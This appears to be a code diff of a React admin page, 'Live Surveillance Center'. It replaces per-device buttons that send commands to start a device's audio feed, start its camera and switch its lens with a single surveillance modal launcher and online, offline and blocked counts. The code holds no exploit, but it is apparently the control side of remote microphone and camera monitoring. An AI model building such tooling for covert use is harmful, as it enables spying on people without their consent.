@@ -62,9 +62,6 @@ export default function SurveillancePage() {
   const [search, setSearch] = useState('');
   const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
   const [audioLevels, setAudioLevels] = useState<AudioLevels>({});
-  const [activeAudio, setActiveAudio] = useState<Set<string>>(new Set());
-  const [activeCamera, setActiveCamera] = useState<Set<string>>(new Set());
-  const [actionStatus, setActionStatus] = useState<Record<string, string>>({});
   const wsRef = useRef<WebSocket | null>(null);
 
   // Fetch all devices
@@ -105,59 +102,6 @@ export default function SurveillancePage() {
     return () => ws.close();
   }, []);
 
-  const sendCommand = async (deviceId: string, endpoint: string): Promise<boolean> => {
-    try {
-      const res = await fetch(
-        `${API_BASE}/api/admin/devices/${encodeURIComponent(deviceId)}/${endpoint}`,
-        { method: 'POST' }
-      );
-      const data = await res.json();
-      return data.delivered === true;
-    } catch {
-      return false;
-    }
-  };
-
-  const setStatus = (deviceId: string, msg: string) => {
-    setActionStatus((prev) => ({ ...prev, [deviceId]: msg }));
-    setTimeout(() => setActionStatus((prev) => { const n = { ...prev }; delete n[deviceId]; return n; }), 4000);
-  };
-
-  const handleToggleAudio = async (device: Device) => {
-    const isActive = activeAudio.has(device.device_id);
-    if (isActive) {
-      await sendCommand(device.device_id, 'stop-audio-feed');
-      setActiveAudio((prev) => { const s = new Set(prev); s.delete(device.device_id); return s; });
-      setAudioLevels((prev) => ({ ...prev, [device.device_id]: { db: -80, active: false } }));
-      setStatus(device.device_id, '🔇 Audio stopped');
-    } else {
-      setSelectedDevice(device);
-      const delivered = await sendCommand(device.device_id, 'start-audio-feed');
-      setActiveAudio((prev) => new Set(prev).add(device.device_id));
-      setStatus(device.device_id, delivered ? '🎙️ Opening Audio Viewport…' : '⚠️ Command queued');
-    }
-  };
-
-  const handleToggleCamera = async (device: Device) => {
-    const isActive = activeCamera.has(device.device_id);
-    if (isActive) {
-      await sendCommand(device.device_id, 'stop-camera-feed');
-      setActiveCamera((prev) => { const s = new Set(prev); s.delete(device.device_id); return s; });
-      setStatus(device.device_id, '📷 Camera stopped');
-    } else {
-      setSelectedDevice(device);
-      const delivered = await sendCommand(device.device_id, 'start-camera-feed');
-      setActiveCamera((prev) => new Set(prev).add(device.device_id));
-      setStatus(device.device_id, delivered ? '📷 Opening Video Viewport…' : '⚠️ Camera command queued');
-    }
-  };
-
-  const handleRotateCamera = async (device: Device) => {
-    setStatus(device.device_id, '🔄 Rotating camera lens (front/back)...');
-    const delivered = await sendCommand(device.device_id, 'switch-camera');
-    setStatus(device.device_id, delivered ? '📷 Camera lens switched' : '⚠️ Rotate command queued');
-  };
-
   const filtered = devices.filter((d) => {
     const q = search.toLowerCase();
     return (
@@ -168,8 +112,9 @@ export default function SurveillancePage() {
     );
   });
 
-  const activeAudioCount = activeAudio.size;
-  const activeCameraCount = activeCamera.size;
+  const onlineCount = devices.filter((d) => Date.now() - d.last_sync_timestamp < 300000).length;
+  const offlineCount = devices.length - onlineCount;
+  const blockedCount = devices.filter((d) => d.is_blocked).length;
 
   return (
     <div className="p-8 max-w-7xl mx-auto">
@@ -180,7 +125,7 @@ export default function SurveillancePage() {
             🛰️ Live Surveillance Center
           </h1>
           <p className="text-slate-500 mt-1 text-sm font-medium">
-            Monitor all registered devices — activate live audio listening or camera feed per device.
+            Monitor registered devices — launch live camera and audio surveillance modal per device.
           </p>
         </div>
         <button
@@ -198,9 +143,9 @@ export default function SurveillancePage() {
       <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
         {[
           { label: 'Total Devices', value: devices.length, color: 'text-indigo-600', bg: 'bg-indigo-50/60' },
-          { label: 'Online (≤5m)', value: devices.filter((d) => Date.now() - d.last_sync_timestamp < 300000).length, color: 'text-emerald-600', bg: 'bg-emerald-50/60' },
-          { label: 'Audio Active', value: activeAudioCount, color: 'text-purple-600', bg: 'bg-purple-50/60' },
-          { label: 'Camera Active', value: activeCameraCount, color: 'text-blue-600', bg: 'bg-blue-50/60' },
+          { label: 'Online (≤5m)', value: onlineCount, color: 'text-emerald-600', bg: 'bg-emerald-50/60' },
+          { label: 'Offline', value: offlineCount, color: 'text-slate-600', bg: 'bg-slate-50/60' },
+          { label: 'Blocked', value: blockedCount, color: 'text-rose-600', bg: 'bg-rose-50/60' },
         ].map((s) => (
           <div key={s.label} className={`${s.bg} border border-slate-200/80 rounded-2xl p-5 shadow-sm bg-white`}>
             <div className={`text-3xl font-bold ${s.color}`}>{s.value}</div>
@@ -239,27 +184,20 @@ export default function SurveillancePage() {
       ) : (
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-5">
           {filtered.map((device) => {
-            const isAudioOn = activeAudio.has(device.device_id);
-            const isCameraOn = activeCamera.has(device.device_id);
             const level = audioLevels[device.device_id];
             const dbVal = level?.active ? level.db.toFixed(1) : '—';
-            const status = actionStatus[device.device_id];
             const initial = (device.username || device.device_model || '?').charAt(0).toUpperCase();
 
             return (
               <div
                 key={device.device_id}
-                className={`bg-white border rounded-2xl shadow-sm flex flex-col overflow-hidden transition-all hover:shadow-md ${
-                  isAudioOn ? 'border-purple-300 ring-1 ring-purple-200' : 'border-slate-200/80'
-                }`}
+                className="bg-white border border-slate-200/80 rounded-2xl shadow-sm flex flex-col overflow-hidden transition-all hover:shadow-md"
               >
                 {/* Card Header */}
                 <div className="p-4 pb-3 flex items-start gap-3">
                   {/* Avatar */}
-                  <div className={`w-10 h-10 rounded-xl flex-shrink-0 flex items-center justify-center text-white font-bold text-sm shadow-sm ${
-                    isAudioOn ? 'bg-purple-600' : isCameraOn ? 'bg-blue-600' : 'bg-indigo-500'
-                  }`}>
-                    {isAudioOn ? '🎙️' : isCameraOn ? '📷' : initial}
+                  <div className="w-10 h-10 rounded-xl flex-shrink-0 flex items-center justify-center text-white font-bold text-sm shadow-sm bg-indigo-600">
+                    {initial}
                   </div>
 
                   {/* Info */}
@@ -284,78 +222,23 @@ export default function SurveillancePage() {
                 <div className="px-4 pb-3">
                   <div className="flex items-center justify-between mb-1">
                     <span className="text-[10px] text-slate-500 font-medium uppercase tracking-wide">
-                      {isAudioOn ? '🔴 Live Audio' : 'Audio Level'}
+                      Audio Level
                     </span>
-                    <span className={`text-[10px] font-mono font-bold ${isAudioOn ? 'text-purple-600' : 'text-slate-400'}`}>
+                    <span className="text-[10px] font-mono font-bold text-slate-400">
                       {dbVal} {level?.active ? 'dB' : ''}
                     </span>
                   </div>
-                  <MiniDbBar db={level?.db ?? -80} active={isAudioOn && Boolean(level?.active)} />
+                  <MiniDbBar db={level?.db ?? -80} active={Boolean(level?.active)} />
                 </div>
 
-                {/* Status toast */}
-                {status && (
-                  <div className="mx-4 mb-3 px-3 py-1.5 bg-indigo-50 border border-indigo-200 text-indigo-700 text-[10px] font-semibold rounded-lg">
-                    {status}
-                  </div>
-                )}
-
-                {/* Camera active badge */}
-                {isCameraOn && (
-                  <div className="mx-4 mb-3 px-3 py-1.5 bg-blue-50 border border-blue-200 text-blue-700 text-[10px] font-semibold rounded-lg flex items-center gap-1.5">
-                    <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
-                    Camera feed command active
-                  </div>
-                )}
-
-                {/* Action Buttons */}
-                <div className="mt-auto border-t border-slate-100 p-3 grid grid-cols-4 gap-1.5">
-                  {/* Audio Toggle */}
-                  <button
-                    onClick={() => handleToggleAudio(device)}
-                    className={`flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold transition cursor-pointer ${
-                      isAudioOn
-                        ? 'bg-purple-600 text-white hover:bg-purple-700'
-                        : 'bg-purple-50 text-purple-700 border border-purple-200 hover:bg-purple-100'
-                    }`}
-                    title={isAudioOn ? 'Stop Audio Feed' : 'Start Audio Listen'}
-                  >
-                    <span className="text-base">{isAudioOn ? '🔇' : '🎙️'}</span>
-                    <span>{isAudioOn ? 'Stop' : 'Listen'}</span>
-                  </button>
-
-                  {/* Camera Toggle */}
-                  <button
-                    onClick={() => handleToggleCamera(device)}
-                    className={`flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold transition cursor-pointer ${
-                      isCameraOn
-                        ? 'bg-blue-600 text-white hover:bg-blue-700'
-                        : 'bg-blue-50 text-blue-700 border border-blue-200 hover:bg-purple-100'
-                    }`}
-                    title={isCameraOn ? 'Stop Camera Feed' : 'Start Camera Feed'}
-                  >
-                    <span className="text-base">{isCameraOn ? '📵' : '📷'}</span>
-                    <span>{isCameraOn ? 'Stop' : 'Camera'}</span>
-                  </button>
-
-                  {/* Rotate / Switch Camera */}
-                  <button
-                    onClick={() => handleRotateCamera(device)}
-                    className="flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold bg-amber-50 text-amber-700 border border-amber-200 hover:bg-amber-100 transition cursor-pointer"
-                    title="Rotate Camera (Front ↔ Back)"
-                  >
-                    <span className="text-base">🔄</span>
-                    <span>Rotate</span>
-                  </button>
-
-                  {/* Full Panel */}
+                {/* Single Surveillance Action Button */}
+                <div className="mt-auto border-t border-slate-100 p-3.5">
                   <button
                     onClick={() => setSelectedDevice(device)}
-                    className="flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold bg-indigo-50 text-indigo-700 border border-indigo-200 hover:bg-indigo-100 transition cursor-pointer"
-                    title="Open Full Surveillance Panel"
+                    className="w-full flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl text-xs font-bold bg-indigo-600 hover:bg-indigo-700 active:scale-[0.98] text-white shadow-sm hover:shadow transition-all cursor-pointer"
                   >
-                    <span className="text-base">🛰️</span>
-                    <span>Details</span>
+                    <span className="text-sm">🛰️</span>
+                    <span>Live Device Surveillance</span>
                   </button>
                 </div>
               </div>
